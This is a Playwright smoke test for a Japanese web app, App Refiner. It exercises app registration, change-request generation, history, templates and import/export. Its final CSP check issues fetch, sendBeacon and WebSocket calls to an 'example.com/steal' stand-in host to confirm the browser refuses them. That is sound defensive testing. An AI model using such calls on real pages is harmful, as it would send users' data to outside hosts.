/**
 * App Refiner スモークテスト（Playwright）
 *
 * 使い方:
 *   npx http-server . -p 8899 --silent   # リポジトリ直下で静的配信
 *   node tests/smoke.mjs             # 別ターミナルで実行
 *
 * ポートは環境変数 PORT で変更できます（既定 8899）。
 *
 * 注意: CDN（cdn.tailwindcss.com / cdnjs）に到達できない環境では見た目が崩れますが、
 * ここで検証しているのは機能なのでテスト結果には影響しません。
 * スクリーンショットの出力先は環境変数 SHOT で変更できます。
 */
import { chromium } from 'playwright';

const errors = [];
const browser = await chromium.launch();
const ctx = await browser.newContext({
  viewport: { width: 390, height: 844 },
  isMobile: true, hasTouch: true,
  permissions: ['clipboard-read', 'clipboard-write'],
});
const page = await ctx.newPage();
page.on('pageerror', e => errors.push('pageerror: ' + e.message));
page.on('console', m => { if (m.type() === 'error') errors.push('console: ' + m.text()); });

const PORT = process.env.PORT || '8899';
const BASE = 'http://127.0.0.1:' + PORT;
await page.goto(BASE + '/index.html', { waitUntil: 'domcontentloaded' });
await page.waitForTimeout(1200);

const log = [];
const ok = (n, c) => log.push((c ? 'PASS ' : 'FAIL ') + n);

// STEP1: 初期アプリ4件（AR-3: app-refiner 自身を含む）
const cards = await page.locator('[data-app-card]').count();
ok('初期アプリ4件 (got ' + cards + ')', cards === 4);
const initialTexts = await page.locator('[data-app-card]').allInnerTexts();
ok('初期登録に app-refiner を含む', initialTexts.some(t => t.includes('app-refiner')));
ok('AR-3 初期登録が店舗系アプリになっている',
  initialTexts.some(t => t.includes('store-communication-app')) &&
  initialTexts.some(t => t.includes('store-feedback')));
ok('AR-3 テスト用アプリは外れている',
  !initialTexts.some(t => t.includes('app-studio-e2e-test')));

// プレビューボックス存在
ok('プレビュー領域あり', await page.locator('.preview-box').count() === 4);

// AR-9: プレビュー枠が十分な高さを持つ
const geo = await page.evaluate(() => {
  const b = document.querySelector('.preview-box');
  const r = b.getBoundingClientRect();
  return { h: Math.round(r.height), visible: Math.round(r.height / (r.width / 390)) };
});
ok('AR-9 プレビュー枠の高さ ' + geo.h + 'px', geo.h >= 180);
ok('AR-9 相手ページが ' + geo.visible + 'px 見える（旧123px）', geo.visible >= 190);

// AR-2: プレビューの再読み込みボタンとURLラベル
ok('AR-2 再読み込みボタンあり', await page.locator('[data-act="reload-preview"]').count() === 4);
ok('AR-2 URLラベルが常時表示',
  (await page.locator('[data-app-card]').first().innerText()).includes('yuda890201.github.io'));

// アプリ追加
await page.click('#btnAddApp');
await page.fill('#appName', 'App Refiner');
await page.fill('#appRepo', 'app-refiner');
await page.locator('#appRepo').blur();
await page.waitForTimeout(100);
const autoUrl = await page.inputValue('#appUrl');
ok('リポジトリ名からURL自動補完 (' + autoUrl + ')', autoUrl === 'https://yuda890201.github.io/app-refiner/');
await page.fill('#appMemo', 'この司令塔アプリ自身');
await page.click('#btnSaveApp');
await page.waitForTimeout(300);
ok('アプリ追加で5件', await page.locator('[data-app-card]').count() === 5);

// 追加したアプリが選択中になっている
await page.waitForTimeout(200);
const selMark = await page.locator('[data-app-card] [data-selected-mark]:not([hidden])').count();
ok('選択中バッジ1件 (got ' + selMark + ')', selMark === 1);

// STEP2: 改修する → composeタブへ
await page.locator('[data-app-card]').nth(4).locator('[data-act="select"]').click();
await page.waitForTimeout(400);
ok('指示書タブが表示', await page.locator('#tab-compose').isVisible());
ok('対象アプリ名が表示', (await page.locator('#composeTarget').innerText()).includes('App Refiner'));

// プリセット追記
await page.locator('[data-preset="スマホ最適化"]').click();
await page.locator('[data-preset="バグ修正"]').click();
await page.waitForTimeout(100);
const body = await page.inputValue('#reqBody');
ok('プリセット2件追記', body.includes('スマホ最適化') && body.includes('バグ修正'));
ok('文字数カウンタ更新', (await page.locator('#reqCount').innerText()).includes(String(body.length)));

// 種類・優先度
await page.selectOption('#reqType', 'UI改善');
await page.selectOption('#reqPriority', '高');

// STEP3: 生成
await page.click('#btnGenerate');
await page.waitForTimeout(400);
const out = await page.locator('#outputText').innerText();
ok('生成物に @App Studio', out.startsWith('@App Studio'));
ok('生成物にアプリ名見出し', out.includes('# 改修指示書：App Refiner'));
ok('生成物にリポジトリ', out.includes('* 対象リポジトリ: app-refiner'));
ok('生成物に公開URL', out.includes('* 公開URL: https://yuda890201.github.io/app-refiner/'));
ok('生成物に種類/優先度', out.includes('* 改修の種類: UI改善 / 優先度: 高'));
ok('生成物に改修要望節', out.includes('## 改修要望'));
ok('生成物に制約3項目', out.includes('* 既存の機能を壊さないこと。') && out.includes('* index.html 単一ファイル構成を維持すること。') && out.includes('* 変更点を箇条書きで報告すること。'));

// コピー → 履歴保存
await page.click('#btnCopy');
await page.waitForTimeout(500);
const clip = await page.evaluate(() => navigator.clipboard.readText());
ok('クリップボード内容一致', clip.trim() === out.trim());

// 履歴タブ
await page.locator('.nav-btn[data-tab="tab-history"]').click();
await page.waitForTimeout(400);
ok('履歴1件', await page.locator('[data-history]').count() === 1);
ok('履歴バッジ表示', await page.locator('#historyBadge').isVisible());

// AR-11: アプリカードの未対応件数バッジ
await page.locator('.nav-btn[data-tab="tab-apps"]').click();
await page.waitForTimeout(300);
ok('AR-11 未対応バッジ1件表示',
  await page.locator('[data-app-card] [data-open-count]:not([hidden])').count() === 1);
ok('AR-11 バッジの文言', (await page.locator('[data-open-count]:not([hidden])').innerText()).includes('未対応 1'));

// AR-5: 履歴の検索
await page.locator('.nav-btn[data-tab="tab-history"]').click();
await page.waitForTimeout(300);
await page.fill('#historySearch', 'スマホ最適化');
await page.waitForTimeout(400);
ok('AR-5 一致する語で1件', await page.locator('[data-history]').count() === 1);
await page.fill('#historySearch', 'ぜったいにないことば');
await page.waitForTimeout(400);
ok('AR-5 一致しない語で0件', await page.locator('[data-history]').count() === 0);
ok('AR-5 未ヒット時の案内', (await page.locator('#historyList').innerText()).includes('一致する履歴はありません'));
await page.fill('#historySearch', '');
await page.waitForTimeout(400);
ok('AR-5 検索クリアで戻る', await page.locator('[data-history]').count() === 1);
ok('AR-5 履歴が1アプリのみならアプリ選択は隠れる', await page.locator('#historyApp').isHidden());

// 二重コピーで重複しない
await page.locator('.nav-btn[data-tab="tab-compose"]').click();
await page.click('#btnCopy');
await page.waitForTimeout(400);
await page.locator('.nav-btn[data-tab="tab-history"]').click();
await page.waitForTimeout(300);
ok('再コピーでも履歴は1件のまま', await page.locator('[data-history]').count() === 1);

// 対応済みトグル
await page.locator('[data-history] input[data-act="done"]').check();
await page.waitForTimeout(300);
ok('対応済みでバッジ消える', !(await page.locator('#historyBadge').isVisible()));
ok('フィルタ: 対応済み1件', (await page.locator('[data-filter="done"]').innerText()).includes('1'));
await page.locator('[data-filter="open"]').click();
await page.waitForTimeout(200);
ok('未対応フィルタで0件表示', await page.locator('[data-history]').count() === 0);
await page.locator('[data-filter="all"]').click();
await page.waitForTimeout(200);

// 履歴からの再コピー
await page.evaluate(() => navigator.clipboard.writeText('x'));
await page.locator('[data-history] [data-act="copy"]').click();
await page.waitForTimeout(400);
const clip2 = await page.evaluate(() => navigator.clipboard.readText());
ok('履歴から再コピー', clip2.includes('# 改修指示書：App Refiner'));

// AR-4: 履歴からの再依頼（いったん入力欄を空にしてから復元されることを見る）
await page.locator('.nav-btn[data-tab="tab-compose"]').click();
await page.waitForTimeout(300);
await page.fill('#reqBody', '');
await page.locator('.nav-btn[data-tab="tab-history"]').click();
await page.waitForTimeout(300);
await page.locator('[data-history] [data-act="reuse"]').click();
await page.waitForTimeout(500);
ok('AR-4 指示書タブへ移動', await page.locator('#tab-compose').isVisible());
ok('AR-4 本文が復元される', (await page.inputValue('#reqBody')).includes('スマホ最適化'));
ok('AR-4 種類が復元される', (await page.inputValue('#reqType')) === 'UI改善');
ok('AR-4 優先度が復元される', (await page.inputValue('#reqPriority')) === '高');
ok('AR-4 生成結果はリセットされる', await page.locator('#outputWrap').isHidden());

// AR-12: 指示書に改修履歴を含める
await page.check('#includeHistory');
await page.waitForTimeout(200);
await page.click('#btnGenerate');
await page.waitForTimeout(400);
const outH = await page.locator('#outputText').innerText();
ok('AR-12 これまでの改修依頼の節が入る', outH.includes('## これまでの改修依頼'));
ok('AR-12 履歴の行が入る', /\* \d{4}\/\d{2}\/\d{2} .+UI改善/.test(outH));
ok('AR-12 節の順序（要望→履歴→制約）',
  outH.indexOf('## 改修要望') < outH.indexOf('## これまでの改修依頼') &&
  outH.indexOf('## これまでの改修依頼') < outH.indexOf('## 制約'));
await page.uncheck('#includeHistory');
await page.waitForTimeout(200);
await page.click('#btnGenerate');
await page.waitForTimeout(400);
ok('AR-12 オフなら従来どおり',
  !(await page.locator('#outputText').innerText()).includes('## これまでの改修依頼'));

// 永続化（リロード）
await page.reload({ waitUntil: 'domcontentloaded' });
await page.waitForTimeout(800);
ok('リロード後もアプリ5件', await page.locator('[data-app-card]').count() === 5);
await page.locator('.nav-btn[data-tab="tab-history"]').click();
await page.waitForTimeout(300);
ok('リロード後も履歴1件', await page.locator('[data-history]').count() === 1);
await page.locator('.nav-btn[data-tab="tab-compose"]').click();
await page.waitForTimeout(200);
ok('リロード後も下書き保持', (await page.inputValue('#reqBody')).includes('スマホ最適化'));

// エクスポート
await page.click('#btnSettings');
await page.waitForTimeout(300);
await page.click('#btnExportCopy');
await page.waitForTimeout(400);
const exported = await page.inputValue('#exportText');
let parsed = null; try { parsed = JSON.parse(exported); } catch {}
ok('エクスポートJSONが妥当', !!parsed && parsed.apps.length === 5 && parsed.history.length >= 1);

// AR-3: アプリのまとめて追加（リポジトリ名 / owner/repo / 公開URL の3形式）
const beforeBulk = await page.locator('[data-app-card]').count();
await page.fill('#bulkRepos',
  'shift-management-app\nyuda890201/incentive-board\nhttps://yuda890201.github.io/kinko-app/\nstore-feedback\n!!!invalid!!!');
await page.click('#btnBulkAdd');
await page.waitForTimeout(600);
const bulkToast = await page.locator('#toast').innerText();
ok('まとめて追加: 3件追加された (' + bulkToast.replace(/\s+/g, ' ').trim() + ')', bulkToast.includes('3 件を追加'));
ok('まとめて追加: 登録済みは飛ばす', bulkToast.includes('登録済み 1 件'));
ok('まとめて追加: 読めない行を数える', bulkToast.includes('読めない行 1 件'));
await page.locator('[data-close="settingsModal"]').first().click();
await page.locator('.nav-btn[data-tab="tab-apps"]').click();
await page.waitForTimeout(500);
const afterBulk = await page.locator('[data-app-card]').count();
ok('まとめて追加: カードが3件増えた (' + beforeBulk + ' → ' + afterBulk + ')', afterBulk === beforeBulk + 3);
const bulkTexts = await page.locator('[data-app-card]').allInnerTexts();
ok('まとめて追加: リポジトリ名からアプリ名を作る',
  bulkTexts.some(t => t.includes('Shift Management App')));
ok('まとめて追加: owner/repo 形式を解釈する',
  bulkTexts.some(t => t.includes('incentive-board')));
ok('まとめて追加: 公開URL形式を解釈する',
  bulkTexts.some(t => t.includes('kinko-app')));
await page.click('#btnSettings');
await page.waitForTimeout(300);

// AR-6: 指示書テンプレート（制約）の編集
await page.fill('#tplBase', '* 既存の機能を壊さないこと。\n* 追加した独自ルール。');
await page.waitForTimeout(500);
await page.locator('[data-close="settingsModal"]').first().click();
await page.locator('.nav-btn[data-tab="tab-compose"]').click();
await page.waitForTimeout(300);
await page.click('#btnGenerate');
await page.waitForTimeout(400);
const outT = await page.locator('#outputText').innerText();
ok('AR-6 編集した制約が反映される', outT.includes('* 追加した独自ルール。'));
ok('AR-6 消した既定行は出ない', !outT.includes('* 変更点を箇条書きで報告すること。'));

// AR-7: 種類ごとの追加制約
await page.click('#btnSettings');
await page.waitForTimeout(300);
await page.click('#btnTplRecommend');
await page.waitForTimeout(400);
await page.selectOption('#tplType', 'リファクタ');
await page.waitForTimeout(200);
ok('AR-7 おすすめが種類別に入る',
  (await page.inputValue('#tplByType')).includes('外から見た挙動を変えないこと'));
await page.locator('[data-close="settingsModal"]').first().click();
await page.locator('.nav-btn[data-tab="tab-compose"]').click();
await page.waitForTimeout(300);
await page.selectOption('#reqType', 'リファクタ');
await page.click('#btnGenerate');
await page.waitForTimeout(400);
const outR = await page.locator('#outputText').innerText();
ok('AR-7 リファクタ時だけの制約が付く', outR.includes('* 外から見た挙動を変えないこと。'));
await page.selectOption('#reqType', 'UI改善');
await page.click('#btnGenerate');
await page.waitForTimeout(400);
ok('AR-7 別の種類では付かない',
  !(await page.locator('#outputText').innerText()).includes('* 外から見た挙動を変えないこと。'));

// テンプレートを既定に戻す
await page.click('#btnSettings');
await page.waitForTimeout(300);
await page.click('#btnTplReset');
await page.waitForTimeout(300);
await page.click('#confirmOk');
await page.waitForTimeout(400);
ok('AR-6 既定に戻せる',
  (await page.inputValue('#tplBase')).includes('* 変更点を箇条書きで報告すること。'));
await page.locator('[data-close="settingsModal"]').first().click();
await page.locator('.nav-btn[data-tab="tab-compose"]').click();
await page.waitForTimeout(300);
await page.click('#btnGenerate');
await page.waitForTimeout(400);
ok('AR-6 既定に戻すと従来の出力',
  (await page.locator('#outputText').innerText()).includes('* 変更点を箇条書きで報告すること。'));
await page.click('#btnSettings');
await page.waitForTimeout(300);

// AR-2: プレビュー表示トグル（カード数は先行するテストで変動するので相対で見る）
const cardsNow = await page.locator('[data-app-card]').count();
await page.uncheck('#optPreview');
await page.waitForTimeout(400);
ok('AR-2 トグルOFFでプレビュー非表示', await page.locator('.preview-box').count() === 0);
await page.check('#optPreview');
await page.waitForTimeout(400);
ok('AR-2 トグルONで復帰 (' + cardsNow + '件)', await page.locator('.preview-box').count() === cardsNow);

// インポート（置き換え）
const payload = JSON.stringify({ app: 'app-refiner', version: 1, apps: [{ id: 'x1', name: 'Imported', repo: 'imported-app', url: 'https://example.com/', memo: 'm' }], history: [] });
await page.fill('#importText', payload);
await page.click('#btnImportReplace');
await page.waitForTimeout(200);
await page.click('#confirmOk');
await page.waitForTimeout(400);
await page.locator('[data-close="settingsModal"]').first().click();
await page.locator('.nav-btn[data-tab="tab-apps"]').click();
await page.waitForTimeout(400);
ok('置き換えインポートで1件', await page.locator('[data-app-card]').count() === 1);
ok('インポートしたアプリ名', (await page.locator('[data-app-card]').innerText()).includes('Imported'));

// 履歴全削除の確認ダイアログ
await page.locator('.nav-btn[data-tab="tab-history"]').click();
await page.waitForTimeout(300);
await page.click('#btnClearHistory');
await page.waitForTimeout(300);
ok('履歴なしで全削除は警告のみ', await page.locator('#confirmModal').isHidden());

// 初期化
await page.click('#btnSettings');
await page.waitForTimeout(200);
await page.click('#btnResetAll');
await page.waitForTimeout(200);
ok('初期化で確認ダイアログ', await page.locator('#confirmModal').isVisible());
await page.click('#confirmOk');
await page.waitForTimeout(500);
await page.locator('.nav-btn[data-tab="tab-apps"]').click();
await page.waitForTimeout(300);
ok('初期化でプリセット4件に戻る', await page.locator('[data-app-card]').count() === 4);

// プレビュー不可の表示（存在しないURL）
await page.click('#btnAddApp');
await page.fill('#appName', 'Broken');
await page.fill('#appUrl', '');
await page.click('#btnSaveApp');
await page.waitForTimeout(400);
const lastCard = page.locator('[data-app-card]').last();
await lastCard.scrollIntoViewIfNeeded();
await page.waitForTimeout(600);
const fbTexts = await lastCard.locator('.preview-fallback').allInnerTexts();
ok('URL未設定はプレビュー不可表示', fbTexts.some(t => t.includes('プレビュー不可')));

// CSP: 実際に外へ出られないことを確認する。
// 注意: sendBeacon は true を返し WebSocket は例外を投げないので、戻り値では判定できない。
// ブラウザが拒否したかどうかは CSP の違反ログでしか分からない。
const cspViolations = [];
page.on('console', m => {
  const t = m.text();
  if (/Content Security Policy|Refused to connect/i.test(t)) cspViolations.push(t);
});
ok('CSP の meta がある', (await page.content()).includes('Content-Security-Policy'));
await page.evaluate(async () => {
  try { await fetch('https://example.com/steal'); } catch (e) {}
  try { navigator.sendBeacon('https://example.com/steal', 'x'); } catch (e) {}
  try { new WebSocket('wss://example.com/x'); } catch (e) {}
});
await page.waitForTimeout(600);
ok('CSP が外部送信を拒否している (' + cspViolations.length + '件)', cspViolations.length >= 3);

// AR-10: Tailwind が読めた/読めないの判定が働いているか
const twState = await page.evaluate(() => ({
  noTw: document.documentElement.classList.contains('no-tw'),
  bodyBg: getComputedStyle(document.body).backgroundColor,
}));
ok('AR-10 CDN到達状況を検出している (no-tw=' + twState.noTw + ')', typeof twState.noTw === 'boolean');
ok('AR-10 どちらの場合も背景が暗い', twState.bodyBg !== 'rgba(0, 0, 0, 0)' && twState.bodyBg !== 'rgb(255, 255, 255)');

await page.screenshot({ path: process.env.SHOT || 'shot.png', fullPage: false });
console.log(log.join('\n'));
console.log('--- errors ---');
console.log(errors.length ? errors.join('\n') : '(none)');
await browser.close();
process.exit(log.some(l => l.startsWith('FAIL')) || errors.length ? 1 : 0);
